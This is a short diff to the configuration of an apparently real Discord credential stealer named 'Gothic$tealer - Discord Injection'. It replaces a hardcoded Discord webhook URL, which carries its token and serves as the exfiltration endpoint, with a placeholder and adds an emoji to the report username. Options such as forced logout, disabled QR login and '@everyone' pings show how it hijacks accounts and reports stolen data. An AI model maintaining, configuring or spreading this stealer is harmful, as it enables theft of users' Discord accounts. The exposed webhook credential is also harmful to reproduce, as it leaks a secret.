@@ -12,7 +12,7 @@ const fs = require("fs");
 var config = {
     brand: "Gothic",
 
-    webhook: "https://discord.com/api/webhooks/1187764905332457483/HtcNR-TOlb7mvaTdZ82g_NspqLuWzBQh_IcjPnpkuopoVjnqVq8aqi8hUdCfJBWzX2OR",
+    webhook: "%WEBHOOK%",
 
     logout: true,
     disable_qr_code: true,
@@ -22,7 +22,7 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "Gothic$tealer - Discord Injection",
+        username: "Gothic$tealer - Discord Injection 👀",
         footer: {
             text: `@Gothic$tealer 🏴‍☠️`,
         },
